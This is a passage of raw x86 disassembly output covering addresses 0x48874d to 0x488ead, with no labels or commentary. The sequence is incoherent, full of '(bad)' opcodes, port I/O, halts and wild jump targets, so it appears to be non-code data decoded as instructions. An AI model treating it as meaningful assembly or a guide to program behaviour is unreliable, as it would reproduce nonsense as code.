  48874d:	pop    esp
  48874e:	adc    BYTE PTR fs:[esi],bh
  488751:	fstp   QWORD PTR cs:[ebx]
  488754:	fs adc al,0x3e
  488757:	sbb    al,0x12
  488759:	dec    eax
  48875a:	xor    DWORD PTR [eax+edi*1],esi
  48875d:	int    0x54
  48875f:	sahf   
  488760:	inc    ebx
  488761:	inc    eax
  488762:	xor    BYTE PTR [eax+0x3a],bl
  488765:	pop    esp
  488766:	mov    edx,0x642e7c0b
  48876b:	or     al,0xa0
  48876d:	inc    eax
  48876e:	jl     0x488799
  488770:	cmp    BYTE PTR [esi-0x71],0xf8
  488774:	pop    esp
  488775:	mov    ah,ch
  488777:	lahf   
  488778:	push   ds
  488779:	mov    al,ds:0x4d3ea41f
  48877e:	fidivr DWORD PTR [ecx-0x3d]
  488781:	jmp    0xad10ba32
  488786:	(bad)  
  488787:	leave  
  488788:	in     eax,0x7d
  48878a:	push   es
  48878b:	test   BYTE PTR [edi-0x30],al
  48878e:	xor    ch,BYTE PTR [eax+ebp*8-0x7c830d20]
  488795:	fs fwait
  488797:	hlt    
  488798:	xchg   esp,eax
  488799:	or     al,0xe4
  48879b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48879c:	(bad)  
  48879e:	mov    bh,0xd
  4887a0:	adc    BYTE PTR [edi],bh
  4887a2:	pop    edi
  4887a3:	sbb    BYTE PTR [edi],bh
  4887a5:	jl     0x4887d7
  4887a7:	aas    
  4887a8:	mov    eax,0x35f7cf38
  4887ad:	xor    al,0x33
  4887af:	cmp    al,0x68
  4887b1:	push   edx
  4887b2:	aas    
  4887b3:	repnz popa 
  4887b5:	nop
  4887b6:	xchg   DWORD PTR [esi],esi
  4887b8:	push   eax
  4887b9:	aas    
  4887ba:	push   esp
  4887bb:	cmp    DWORD PTR [eax+0x5f],ebx
  4887be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4887bf:	inc    eax
  4887c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4887c1:	xor    edi,DWORD PTR [eax]
  4887c3:	aas    
  4887c4:	push   ebx
  4887c5:	je     0x48882c
  4887c7:	in     eax,0xc3
  4887c9:	and    al,0x78
  4887cb:	mov    edi,0x2aa5aa7c
  4887d0:	sub    ebx,edi
  4887d2:	dec    ecx
  4887d3:	nop
  4887d4:	xchg   esp,eax
  4887d5:	xor    DWORD PTR [eax+0x79b4b49e],ebx
  4887db:	scas   al,BYTE PTR es:[edi]
  4887dc:	pop    esp
  4887dd:	dec    esi
  4887de:	mov    eax,0x4737e5bc
  4887e3:	fsub   DWORD PTR [edx+esi*4-0x1f23c68e]
  4887ea:	popf   
  4887eb:	sahf   
  4887ec:	cld    
  4887ed:	enter  0xb3cb,0xf2
  4887f1:	add    BYTE PTR [eax+0x4],al
  4887f4:	inc    eax
  4887f5:	outs   dx,DWORD PTR ds:[esi]
  4887f6:	and    BYTE PTR [eax+0x4e],al
  4887f9:	cs xchg ebp,eax
  4887fb:	retf   
  4887fc:	and    al,0x28
  4887fe:	pop    eax
  4887ff:	inc    esp
  488800:	dec    eax
  488801:	jb     0x488875
  488803:	test   eax,0x68414c5c
  488808:	ins    BYTE PTR es:[edi],dx
  488809:	xchg   edi,eax
  48880a:	xchg   ebx,eax
  48880b:	dec    ebx
  48880c:	in     eax,0x70
  48880e:	sub    cl,BYTE PTR [eax+edx*4+0x5e1d3c94]
  488815:	sub    dl,BYTE PTR [ebx]
  488817:	mov    al,0x40
  488819:	jnp    0x48887b
  48881b:	dec    esp
  48881c:	loope  0x488897
  48881e:	icebp  
  48881f:	mov    ecx,0xa89f4084
  488824:	pushf  
  488825:	aas    
  488826:	mov    al,ds:0xf79506df
  48882b:	sub    DWORD PTR [eax+0x75c02826],0x35
  488832:	les    ebp,FWORD PTR [ecx]
  488834:	int3   
  488835:	stos   DWORD PTR es:[edi],eax
  488836:	lock stos DWORD PTR es:[edi],eax
  488838:	cmp    al,0x14
  48883a:	in     al,0x1d
  48883c:	call   0xdff92980
  488841:	xchg   ecx,eax
  488842:	mov    esi,0x9ef012f0
  488847:	mov    eax,0x400cb708
  48884c:	xor    edi,DWORD PTR [edi+edx*4]
  48884f:	xchg   ebp,eax
  488850:	out    0x14,al
  488852:	inc    eax
  488853:	enter  0x2c0d,0x30
  488857:	pop    es
  488858:	nop
  488859:	retf   
  48885a:	in     eax,0xb9
  48885c:	cmp    BYTE PTR [eax+edx*2-0x68d1bcac],bl
  488863:	out    0x5c,eax
  488865:	je     0x4888db
  488867:	js     0x4888b8
  488869:	jo     0x4888c1
  48886b:	sahf   
  48886c:	add    BYTE PTR [eax+0x15],0x98
  488870:	pop    esi
  488871:	cmp    eax,0xbce1d2e5
  488876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488877:	sub    BYTE PTR [ecx+ecx*1],bl
  48887a:	mov    ah,0xb8
  48887c:	sub    ebx,edi
  48887e:	dec    ecx
  48887f:	xor    BYTE PTR gs:[esp+edx*8-0x1a23ce28],bl
  488887:	popf   
  488888:	jns    0x4888e8
  48888a:	dec    esi
  48888b:	sub    bh,al
  48888d:	cld    
  48888e:	add    BYTE PTR [ecx-0x32],al
  488891:	push   edx
  488892:	test   eax,0x411c791c
  488897:	and    BYTE PTR [ecx+0x24],al
  48889a:	mov    bh,0x2e
  48889c:	fucom  st(5)
  48889e:	in     al,0x40
  4888a0:	inc    esp
  4888a1:	dec    eax
  4888a2:	arpl   WORD PTR [eax+0x5ca97264],sp
  4888a8:	dec    esi
  4888a9:	push   0x4988896c
  4888ae:	gs in  eax,0x72
  4888b1:	mov    WORD PTR [eax-0x2353617a],ss
  4888b7:	cs xchg ebp,eax
  4888b9:	retf   
  4888ba:	mov    al,0xb4
  4888bc:	jb     0x48888e
  4888be:	xor    esp,edx
  4888c0:	in     eax,0xe4
  4888c2:	push   edx
  4888c3:	mov    ecx,0xf8f45bd8
  4888c8:	popa   
  4888c9:	stos   BYTE PTR es:[edi],al
  4888ca:	xchg   edi,eax
  4888cb:	retf   0x44fc
  4888ce:	sbb    BYTE PTR [edx-0x49],al
  4888d1:	mov    esp,0xf21cf953
  4888d6:	push   ebp
  4888d7:	ror    al,0xf4
  4888da:	popf   
  4888db:	loopne 0x488872
  4888dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4888de:	xor    DWORD PTR [esi+0x4d40e40a],0xad419d40
  4888e8:	mov    esi,0x85f7641
  4888ed:	inc    ecx
  4888ee:	adc    BYTE PTR [edx],dl
  4888f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4888f1:	popf   
  4888f2:	sub    eax,0x6f9ef928
  4888f7:	nop
  4888f8:	inc    ecx
  4888f9:	sub    al,0x47
  4888fb:	xor    al,0x7c
  4888fd:	addr16 dec esp
  4888ff:	gs in  eax,0x1d
  488902:	jb     0x488954
  488904:	pop    eax
  488905:	xor    bl,BYTE PTR [eax+0x35]
  488908:	jo     0x4888ef
  48890a:	repnz cs iret 
  48890d:	je     0x488917
  48890f:	jl     0x488977
  488911:	xor    BYTE PTR [esp+ebx*2-0x673788c2],dl
  488918:	mov    al,ds:0xbcb83347
  48891d:	mov    ecx,0xc4873e54
  488922:	in     al,0x9c
  488924:	fsubr  st(0),st
  488926:	pop    ecx
  488927:	jns    0x4889a2
  488929:	push   cs
  48892a:	call   0x48a89e7
  48892f:	inc    edx
  488930:	mov    dl,0xea
  488932:	xor    al,0x7
  488934:	or     al,0x42
  488936:	test   BYTE PTR [esp+ebx*1+0x42],bh
  48893a:	mov    eax,ds:0x20b21df2
  48893f:	inc    edx
  488940:	and    al,0x21
  488942:	sub    BYTE PTR ds:0xd02917ca,ch
  488948:	push   edx
  488949:	pop    esp
  48894a:	inc    edx
  48894b:	xor    DWORD PTR [esp+edx*2+0x2e],eax
  48894f:	daa    
  488950:	xchg   edi,eax
  488951:	push   ss
  488952:	pusha  
  488953:	fs push 0x3972b2fc
  488959:	mov    ecx,0x198c8884
  48895e:	pushf  
  48895f:	xchg   edi,eax
  488960:	retf   0xa4e5
  488963:	test   al,0xac
  488965:	mov    al,0xff
  488967:	int3   
  488968:	mov    ecx,0xd0272e54
  48896d:	aam    0xe8
  48896f:	lock in al,0xa5
  488972:	jb     0x4889ad
  488974:	hlt    
  488975:	clc    
  488976:	mov    edx,0xcb934314
  48897b:	mov    bl,0x72
  48897d:	sbb    BYTE PTR [ebx+0x1c],al
  488980:	inc    ebx
  488981:	sar    DWORD PTR [eax],1
  488983:	pushf  
  488984:	pop    esp
  488985:	sub    dl,BYTE PTR [edi+0x5ca3403c]
  48898b:	pusha  
  48898c:	xchg   ch,ah
  48898e:	push   edx
  48898f:	mov    ecx,0x28808c64
  488994:	dec    ebx
  488995:	ret    
  488996:	jge    0x488936
  488998:	xor    BYTE PTR [eax-0x5d],ah
  48899b:	dec    eax
  48899c:	adc    BYTE PTR [esi+0x4c],ah
  48899f:	ja     0x488993
  4889a1:	add    DWORD PTR [edi+0x589c3454],ebx
  4889a7:	ins    BYTE PTR es:[edi],dx
  4889a8:	inc    edx
  4889a9:	jo     0x4889de
  4889ab:	and    DWORD PTR [edi+0x878cf0f],edx
  4889b1:	mov    ebx,0x5c879490
  4889b6:	sub    bl,bh
  4889b8:	pushf  
  4889b9:	xor    ah,ah
  4889bb:	fwait
  4889bc:	mov    ah,0xb8
  4889be:	rcr    BYTE PTR ds:0xc03cb972,0xd8
  4889c5:	fsubr  st(4),st
  4889c7:	lods   al,BYTE PTR ds:[esi]
  4889c8:	inc    eax
  4889c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4889ca:	repnz into 
  4889cc:	xchg   esp,eax
  4889cd:	fwait
  4889ce:	cld    
  4889cf:	clc    
  4889d0:	add    BYTE PTR [ebx-0x38],al
  4889d3:	retf   0x9def
  4889d6:	or     BYTE PTR [edx],dl
  4889d8:	ins    BYTE PTR es:[edi],dx
  4889d9:	outs   dx,DWORD PTR ds:[esi]
  4889da:	and    BYTE PTR [ebx+0x24],al
  4889dd:	inc    ebx
  4889de:	sbb    esp,esp
  4889e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4889e1:	cmp    DWORD PTR [ebx+eax*2],ebp
  4889e4:	inc    esp
  4889e5:	inc    esp
  4889e6:	inc    ebx
  4889e7:	dec    eax
  4889e8:	cmp    esp,esp
  4889ea:	repnz push cs
  4889ec:	push   eax
  4889ed:	cmp    ah,BYTE PTR [eax]
  4889ef:	push   0x7c7a1f6c
  4889f4:	push   cs
  4889f5:	je     0x4889eb
  4889f7:	call   0x93be:0x8827840b
  4889fe:	push   cs
  4889ff:	sub    esi,DWORD PTR [ebp-0x64]
  488a02:	pop    ecx
  488a03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488a04:	test   al,0x31
  488a06:	lods   al,BYTE PTR ds:[esi]
  488a07:	js     0x488a42
  488a09:	mov    ecx,0xccc85e54
  488a0e:	rol    BYTE PTR [ebx-0x47],1
  488a11:	push   esp
  488a12:	mov    esi,0x53d46fe3
  488a17:	fadd   DWORD PTR [edi-0x14]
  488a1a:	in     al,0x73
  488a1c:	in     eax,0x3b
  488a1e:	lock xor esp,esi
  488a21:	fistp  QWORD PTR [esi+0x49441045]
  488a27:	in     eax,0xb3
  488a29:	jb     0x488a3f
  488a2b:	inc    esp
  488a2c:	sbb    BYTE PTR [ecx+eax*1-0x46],al
  488a30:	xor    al,0x27
  488a32:	xchg   ebp,eax
  488a33:	xchg   ebp,eax
  488a34:	retf   
  488a35:	cmp    BYTE PTR [esi+ecx*8],bh
  488a38:	mov    ecx,0x549c5c58
  488a3d:	push   esi
  488a3e:	cs pusha 
  488a40:	or     bh,BYTE PTR [eax-0xd8d7f84]
  488a46:	pop    esp
  488a47:	mov    ecx,0x477a4484
  488a4c:	mov    al,ds:0x73c9cba4
  488a51:	in     eax,0xa8
  488a53:	call   0xf2b2:0xc8c4466a
  488a5a:	sbb    eax,0x7f44ccc1
  488a5f:	shl    BYTE PTR [edi-0x6b49be2c],1
  488a65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  488a66:	inc    ecx
  488a67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  488a68:	call   0x908bcd91
  488a6d:	inc    ebx
  488a6e:	sub    bl,BYTE PTR [edi]
  488a70:	xchg   esi,eax
  488a71:	enter  0xb09a,0xb4
  488a75:	xor    al,0xf3
  488a77:	cs out dx,eax
  488a79:	mov    esp,0x12e0943a
  488a7e:	ins    BYTE PTR es:[edi],dx
  488a7f:	ins    BYTE PTR es:[edi],dx
  488a80:	clc    
  488a81:	add    al,0xec
  488a83:	sbb    eax,0x459fcbb
  488a88:	mov    al,ds:0x3ca93050
  488a8d:	in     eax,0x29
  488a8f:	dec    edx
  488a90:	inc    esp
  488a91:	inc    esp
  488a92:	es sub al,0x40
  488a95:	mov    es,eax
  488a97:	out    0x52,eax
  488a99:	inc    esp
  488a9a:	dec    esp
  488a9b:	or     al,0x9a
  488a9d:	(bad)
  488aa0:	mov    ecx,0x70682974
  488aa5:	hlt    
  488aa6:	cdq    
  488aa7:	stos   BYTE PTR es:[edi],al
  488aa8:	mov    BYTE PTR [ecx+ebx*8-0x18],al
  488aac:	xor    ecx,eax
  488aae:	mov    WORD PTR [esp+edx*4-0x2c],es
  488ab2:	cdq    
  488ab3:	inc    ecx
  488ab4:	lods   al,BYTE PTR ds:[esi]
  488ab5:	inc    esp
  488ab6:	mov    esp,0xb006fbcb
  488abb:	inc    edi
  488abc:	mov    eax,0x12dc9c32
  488ac1:	jl     0x488a9f
  488ac3:	push   esp
  488ac4:	sbb    ch,al
  488ac6:	loope  0x488b0c
  488ac8:	inc    esp
  488ac9:	(bad)  
  488aca:	ss inc edi
  488acc:	out    0x67,eax
  488ace:	aaa    
  488acf:	repnz inc ebp
  488ad1:	inc    ebp
  488ad2:	xor    DWORD PTR [eax*2+0x3b466c20],edx
  488ad9:	xchg   BYTE PTR [edi+0x38343093],dl
  488adf:	inc    ebp
  488ae0:	push   ebp
  488ae1:	cmp    al,0x53
  488ae3:	xchg   edi,eax
  488ae4:	xchg   ebx,eax
  488ae5:	dec    ebx
  488ae6:	in     eax,0x40
  488ae8:	jp     0x488b3e
  488aea:	pop    eax
  488aeb:	pop    esp
  488aec:	iret   
  488aed:	xchg   ebp,eax
  488aee:	retf   
  488aef:	and    al,0x60
  488af1:	fs xchg ecx,eax
  488af3:	mov    ebp,0x49977845
  488af8:	cs daa 
  488afa:	jl     0x488a7c
  488afc:	test   BYTE PTR [eax+0x2b2a4ef9],cl
  488b02:	mov    bh,BYTE PTR [esp+ebx*4-0x1a5bce60]
  488b09:	jb     0x488b5d
  488b0b:	pop    ecx
  488b0c:	(bad)
  488b10:	enter  0x45f2,0x7a
  488b14:	arpl   WORD PTR [eax],bx
  488b16:	ret    0x4581
  488b19:	jmp    0xed2df30a
  488b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  488b1f:	iret   
  488b20:	or     BYTE PTR [esi+0x31],al
  488b23:	or     al,0x46
  488b25:	adc    BYTE PTR [esi+0x77],al
  488b28:	xchg   edi,eax
  488b29:	xchg   ebx,eax
  488b2a:	retf   0xbb27
  488b2d:	sub    al,0x30
  488b2f:	xor    al,0xb
  488b31:	xor    eax,0x3f3444f4
  488b36:	js     0x488b3a
  488b38:	(bad)  
  488b39:	jmp    0x789cd03e
  488b3e:	sub    DWORD PTR [esp+ebp*4+0x451c4518],0x24
  488b46:	adc    dh,BYTE PTR [eax]
  488b48:	xchg   ebp,eax
  488b49:	iret   
  488b4a:	in     eax,0x7d
  488b4c:	mov    ch,0x48
  488b4e:	adc    dl,BYTE PTR [eax]
  488b50:	ins    BYTE PTR es:[edi],dx
  488b51:	in     al,dx
  488b52:	cwde   
  488b53:	nop
  488b54:	inc    edx
  488b55:	pusha  
  488b56:	mov    ebx,0x63a8cc3c
  488b5b:	xor    BYTE PTR [eax-0x7c820c35],dl
  488b61:	mov    ah,0xa0
  488b63:	mov    al,ds:0x87d0cc98
  488b68:	pop    esp
  488b69:	sub    ch,bh
  488b6b:	fdiv   DWORD PTR [eax]
  488b6d:	js     0x488b5f
  488b6f:	hlt    
  488b70:	cld    
  488b71:	test   DWORD PTR [ecx],eax
  488b73:	js     0x488bee
  488b75:	xchg   esi,eax
  488b76:	pop    eax
  488b77:	adc    al,0x46
  488b79:	mov    edi,0xe5cf7c87
  488b7e:	adc    al,BYTE PTR [esi]
  488b80:	and    BYTE PTR [ebx+edi*1],dh
  488b83:	cmp    BYTE PTR [eax+eiz*8],bh
  488b86:	out    0xb9,eax
  488b88:	cmp    al,0x8
  488b8a:	inc    esp
  488b8b:	adc    al,0xbb
  488b8d:	cmp    DWORD PTR [edi],esi
  488b8f:	mov    bl,0xc3
  488b91:	dec    eax
  488b92:	inc    ebx
  488b93:	gs inc esi
  488b95:	inc    esi
  488b96:	aad    0x58
  488b98:	inc    esi
  488b99:	push   esp
  488b9a:	cs mov bh,0xcb
  488b9d:	cmp    BYTE PTR [ecx+esi*1+0x78],dh
  488ba1:	jl     0x488b77
  488ba3:	push   ecx
  488ba4:	mov    esp,0x98af5edc
  488ba9:	xor    DWORD PTR [eax+eiz*4+0x2a4e5b46],ebx
  488bb0:	sub    ebx,edi
  488bb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488bb3:	test   DWORD PTR [eax-0x3f434564],ebp
  488bb9:	retf   
  488bba:	in     eax,dx
  488bbb:	push   edx
  488bbc:	stc    
  488bbd:	xor    esp,eax
  488bbf:	push   esp
  488bc0:	loopne 0x488b47
  488bc2:	in     al,0x95
  488bc4:	xchg   ebp,eax
  488bc5:	outs   dx,DWORD PTR ds:[esi]
  488bc6:	xchg   edx,eax
  488bc7:	call   0x5438dfb8
  488bcc:	mov    ebp,0xcac87704
  488bd1:	xchg   ecx,eax
  488bd2:	inc    edi
  488bd3:	or     BYTE PTR [edi+0xc],al
  488bd6:	inc    edi
  488bd7:	adc    BYTE PTR [ecx],ah
  488bd9:	jl     0x488c02
  488bdb:	(bad)  
  488bdd:	adc    al,0x7b
  488bdf:	mov    ecx,0x312c2853
  488be4:	xor    BYTE PTR [edx+0x39],dh
  488be7:	test   eax,0x4cb89dac
  488bec:	push   eax
  488bed:	push   esp
  488bee:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  488bf0:	adc    eax,0xf1b606b0
  488bf5:	inc    edi
  488bf6:	inc    edi
  488bf7:	shl    al,cl
  488bf9:	xchg   esp,eax
  488bfa:	dec    ebp
  488bfb:	inc    edi
  488bfc:	daa    
  488bfd:	jns    0x488c30
  488bff:	jl     0x488c5d
  488c01:	cmp    DWORD PTR [esi],0xffffffed
  488c04:	jl     0x488b8f
  488c06:	xor    eax,0xf4681e60
  488c0b:	xchg   edi,eax
  488c0c:	mov    ebp,DWORD PTR [esi]
  488c0e:	iret   
  488c0f:	pop    ss
  488c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488c11:	inc    esi
  488c12:	xor    ecx,DWORD PTR [eax+edx*8-0x1be34450]
  488c19:	repnz inc esi
  488c1b:	mov    ah,0xc8
  488c1d:	cmp    eax,0xd232d4cc
  488c22:	mov    esp,0xf88ccbbc
  488c27:	pop    edx
  488c28:	ins    BYTE PTR es:[edi],dx
  488c29:	sbb    al,0x47
  488c2b:	dec    esp
  488c2c:	sub    DWORD PTR [edi+0x4734f2c0],eax
  488c32:	ins    BYTE PTR es:[edi],dx
  488c33:	inc    edi
  488c34:	jae    0x488c6f
  488c36:	enter  0x32e5,0x30
  488c3a:	pop    eax
  488c3b:	cmp    eax,0x77cf645c
  488c40:	jp     0x488c25
  488c42:	sbb    al,0x97
  488c44:	inc    ebp
  488c45:	inc    edi
  488c46:	sub    DWORD PTR [eax-0x7e189608],ecx
  488c4c:	lds    edx,FWORD PTR [esi-0x6364c2b8]
  488c52:	inc    eax
  488c53:	mov    al,ds:0x5a0dcf23
  488c58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488c59:	inc    edi
  488c5a:	ds jb  0x488cdc
  488c5d:	inc    edi
  488c5e:	inc    edi
  488c5f:	inc    edi
  488c60:	jb     0x488cb4
  488c62:	fldcw  WORD PTR [ecx]
  488c64:	xor    ebp,ecx
  488c66:	jle    0x488c44
  488c68:	loopne 0x488c83
  488c6a:	cmp    ch,BYTE PTR [eax-0x1b]
  488c6d:	in     al,0x71
  488c6f:	imul   edi,DWORD PTR [edi],0x48
  488c72:	dec    edx
  488c74:	ja     0x488c3e
  488c76:	retf   0x4804
  488c79:	or     BYTE PTR [eax+0xc],cl
  488c7c:	and    DWORD PTR [eax],edx
  488c7e:	in     eax,0x8b
  488c80:	cmp    al,0xe8
  488c82:	dec    ecx
  488c83:	ja     0x488ccc
  488c85:	pusha  
  488c86:	dec    eax
  488c87:	xor    DWORD PTR [edx*4+0x6c55edcb],ebp
  488c8e:	add    ecx,DWORD PTR [eax+0x31]
  488c91:	dec    esp
  488c92:	push   eax
  488c93:	jne    0x488ceb
  488c95:	cs daa 
  488c97:	xchg   ebp,eax
  488c98:	mov    bh,0x6c
  488c9a:	jo     0x488d10
  488c9c:	pushf  
  488c9d:	rcr    BYTE PTR [ecx-0x47],0x9c
  488ca1:	push   esp
  488ca2:	nop
  488ca3:	xchg   esp,eax
  488ca4:	cwde   
  488ca5:	jp     0x488c66
  488ca7:	gs in  eax,0x72
  488caa:	push   edx
  488cab:	mov    ah,0xb8
  488cad:	mov    esp,0x952ec105
  488cb2:	retf   
  488cb3:	dec    ecx
  488cb4:	fcomp  st(4)
  488cb6:	loopne 0x488d10
  488cb8:	cld    
  488cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  488cba:	repnz imul ebx,DWORD PTR [eax+0x68],0xc496e4ac
  488cc2:	push   edx
  488cc3:	mov    ecx,0xd0c84bbc
  488cc8:	sub    ah,cl
  488cca:	call   0x9d846cbb
  488ccf:	out    0xf4,eax
  488cd1:	lods   al,BYTE PTR ds:[esi]
  488cd2:	mov    ds:0xa3128476,al
  488cd7:	xor    ch,ah
  488cd9:	or     eax,0x981074d9
  488cde:	xor    al,0x48
  488ce0:	xor    BYTE PTR [eax-0x42],ch
  488ce3:	out    0x90,eax
  488ce5:	dec    ebx
  488ce6:	push   esp
  488ce7:	pop    eax
  488ce8:	pusha  
  488ce9:	push   eax
  488cea:	ja     0x488d64
  488cec:	cmp    eax,0x27d8439f
  488cf1:	push   0x79348447
  488cf6:	lahf   
  488cf7:	inc    edx
  488cf8:	not    ebp
  488cfa:	pushf  
  488cfb:	adc    dl,BYTE PTR [eax+0x1cc2a82b]
  488d01:	cmp    al,0x97
  488d03:	out    0x52,eax
  488d05:	rol    ah,0x6
  488d08:	int3   
  488d09:	add    al,0xf3
  488d0b:	sbb    eax,0xe8e4a972
  488d10:	lock xor ah,ch
  488d13:	xchg   ebp,eax
  488d14:	je     0x488cb5
  488d16:	push   edx
  488d17:	and    dl,bl
  488d19:	dec    ecx
  488d1a:	or     ah,BYTE PTR [ebx-0x60dcf7f8]
  488d20:	das    
  488d21:	sub    bl,BYTE PTR [edx+0x6d831649]
  488d27:	inc    esi
  488d28:	and    BYTE PTR [ecx+0x24],cl
  488d2b:	mov    ecx,0x49959e5d
  488d30:	sub    BYTE PTR [ecx-0x42],cl
  488d33:	inc    esp
  488d34:	xor    DWORD PTR [eax-0x35],ecx
  488d37:	lods   eax,DWORD PTR ds:[esi]
  488d38:	mov    dl,0x72
  488d3a:	dec    esp
  488d3b:	pop    ss
  488d3c:	mov    edi,0x2e6c6368
  488d41:	daa    
  488d42:	xchg   ebp,eax
  488d43:	xchg   ebp,eax
  488d44:	jo     0x488d4a
  488d46:	mov    ebp,0xe594908c
  488d4b:	jb     0x488d1f
  488d4d:	pop    ebp
  488d4e:	ret    
  488d4f:	xor    DWORD PTR [eax-0x346a474c],esi
  488d55:	leave  
  488d56:	jae    0x488db1
  488d58:	mov    bl,0x47
  488d5a:	aam    0xd8
  488d5c:	fdiv   QWORD PTR [esi]
  488d5e:	inc    edx
  488d5f:	das    
  488d60:	daa    
  488d61:	iret   
  488d62:	aad    0x46
  488d64:	clc    
  488d65:	cld    
  488d66:	add    BYTE PTR [edx+0x4a],cl
  488d69:	in     eax,0x6c
  488d6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  488d6c:	in     al,0xb7
  488d6e:	sbb    al,0x4a
  488d70:	xor    DWORD PTR [eax],esp
  488d72:	dec    edx
  488d73:	and    al,0x56
  488d75:	cs daa 
  488d77:	xchg   edi,eax
  488d78:	inc    ebp
  488d79:	inc    eax
  488d7a:	inc    esp
  488d7b:	dec    eax
  488d7c:	jo     0x488d2d
  488d7e:	mov    dl,0xd9
  488d80:	mov    ah,0x54
  488d82:	fs jle 0x488d99
  488d85:	dec    ecx
  488d86:	rcl    BYTE PTR [ebp-0x4df22588],1
  488d8c:	sub    al,0x49
  488d8e:	xor    BYTE PTR [edx],dl
  488d90:	push   ds
  488d91:	cmp    BYTE PTR [eax+0x76fb6d3c],bh
  488d97:	push   ecx
  488d98:	adc    eax,0x3f541f50
  488d9d:	xor    bl,BYTE PTR [eax+eiz*4+0x3e]
  488da1:	fbld   TBYTE PTR [ebp+0x78746cc1]
  488da7:	cmp    eax,0xf2958480
  488dac:	xchg   esp,eax
  488dad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  488dae:	sbb    DWORD PTR [ecx],0x49
  488db1:	dec    ecx
  488db2:	push   edx
  488db3:	jo     0x488ddf
  488db5:	out    dx,eax
  488db6:	nop
  488db7:	scas   eax,DWORD PTR es:[edi]
  488db8:	mov    esp,0x30c8c085
  488dbd:	push   0x873cace0
  488dc2:	pop    esp
  488dc3:	in     al,0xec
  488dc5:	push   esp
  488dc6:	add    al,0x4a
  488dc8:	push   esp
  488dc9:	call   0x4a10:0x4a08ac83
  488dd0:	cmp    BYTE PTR [eax],ch
  488dd2:	dec    edi
  488dd3:	in     eax,0x7d
  488dd5:	sbb    edx,DWORD PTR [ebp+0x343d2c35]
  488ddb:	sub    BYTE PTR [esp+ecx*2],dl
  488dde:	mov    ds:0xbe79d069,eax
  488de3:	push   eax
  488de4:	daa    
  488de5:	pop    eax
  488de6:	or     BYTE PTR [edx],al
  488de8:	dec    edx
  488de9:	clc    
  488dea:	pop    esp
  488deb:	mov    edx,0x3f70354e
  488df0:	je     0x488e6e
  488df2:	hlt    
  488df3:	xchg   esp,eax
  488df4:	and    ecx,DWORD PTR ds:0xd07c1581
  488dfa:	mov    ah,0x67
  488dfc:	dec    edx
  488dfd:	dec    edx
  488dfe:	sbb    DWORD PTR [ecx+0x6e],edi
  488e01:	sub    cl,BYTE PTR [edx+0x42]
  488e04:	loopne 0x488e4c
  488e06:	dec    edx
  488e07:	dec    edx
  488e08:	retf   0x73c8
  488e0b:	push   ebx
  488e0c:	dec    edx
  488e0d:	sub    BYTE PTR [ebx+0x47],dh
  488e10:	dec    edx
  488e11:	dec    edx
  488e12:	push   esp
  488e13:	inc    esi
  488e14:	sub    bl,BYTE PTR [ebx+0x4adf7c4a]
  488e1a:	dec    edx
  488e1b:	dec    edx
  488e1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  488e1d:	xor    dh,dl
  488e1f:	fdivr  QWORD PTR [eax]
  488e21:	jbe    0x488e6a
  488e23:	dec    ebx
  488e24:	dec    ebx
  488e25:	dec    ebx
  488e26:	lods   al,BYTE PTR ds:[esi]
  488e27:	pop    esp
  488e28:	outs   dx,BYTE PTR ds:[esi]
  488e29:	retf   0xe332
  488e2c:	xor    DWORD PTR [eax+0x44],eax
  488e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  488e30:	in     al,0xb9
  488e32:	jb     0x488e6d
  488e34:	test   eax,0x9a686460
  488e39:	pop    DWORD PTR [edi-0x72]
  488e3c:	jmp    0x488e23
  488e3e:	in     al,0x84
  488e40:	mov    BYTE PTR [ebx+ecx*2-0xd8d6f63],cl
  488e47:	pop    esp
  488e48:	stc    
  488e49:	mov    bh,0x94
  488e4b:	inc    edi
  488e4c:	mov    eax,DWORD PTR [edi-0x58]
  488e4f:	lods   al,BYTE PTR ds:[esi]
  488e50:	ret    
  488e51:	dec    ebx
  488e52:	gs in  eax,0xb0
  488e55:	rol    ebx,0xcc
  488e58:	mov    ds:0xe7972594,eax
  488e5d:	ret    
  488e5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  488e5f:	cwde   
  488e60:	mov    al,ds:0xb894e4b6
  488e65:	mov    esp,0x2f572a2f
  488e6a:	les    ecx,FWORD PTR [edx-0x4a]
  488e6d:	xchg   esp,eax
  488e6e:	fcom   QWORD PTR ds:0xde56ece0
  488e74:	and    eax,ebp
  488e76:	pop    esp
  488e77:	mov    ah,0x0
  488e79:	dec    ebx
  488e7a:	xor    DWORD PTR [ebx+ecx*2],eax
  488e7d:	mov    ecx,0xc839a54
  488e82:	dec    ebx
  488e83:	mov    al,ds:0xda4c2824
  488e88:	jns    0x488e98
  488e8a:	xor    BYTE PTR [esi+eiz*1+0x7cf76e48],cl
  488e91:	outs   dx,BYTE PTR ds:[esi]
  488e92:	adc    BYTE PTR [edi+0x54],al
  488e95:	jl     0x488e62
  488e97:	xor    eax,0x7977126c
  488e9c:	dec    edx
  488e9d:	aaa    
  488e9e:	or     BYTE PTR [ebx+0x5e],cl
  488ea1:	pop    esp
  488ea2:	pushf  
  488ea3:	adc    cl,dl
  488ea5:	push   ebx
  488ea6:	add    eax,0x4b943498
  488eab:	dec    ebx
  488eac:	pushf  
  488ead:	dec    ebx
